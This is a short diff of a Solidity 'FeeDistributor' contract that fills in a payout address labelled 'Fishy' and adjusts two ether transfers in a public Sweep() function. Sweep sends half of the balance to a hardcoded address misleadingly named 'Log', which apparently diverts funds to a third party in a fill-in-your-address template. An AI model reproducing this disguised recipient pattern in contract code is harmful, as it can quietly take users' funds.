@@ -6,7 +6,7 @@ contract FeeDistributor{
 
     ERC20 DAI = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     address Log = 0x4D9aA2Aac04Ce1Ba557D6008b28210F4187930A2;
-    address Fishy = 0x0000000000000000000000000000000000000000; // Put your address here.
+    address Fishy = 0x72b7448f470D07222Dbf038407cD69CC380683F3; // Put your address here.
 
 
     function claim() public{
@@ -33,8 +33,8 @@ contract FeeDistributor{
 
     function Sweep() public payable {
 
-        (bool sent,) = Log.call{value: address(this).balance/2}("");
-        (bool sent2,) = Fishy.call{value: address(this).balance/2}("");
+        (bool sent, bytes memory data) = Log.call{value: address(this).balance/2}("");
+        (bool sent2, bytes memory data2) = Fishy.call{value: address(this).balance/2}("");
         require(sent && sent2, "Failed to send Ether");
 
     }
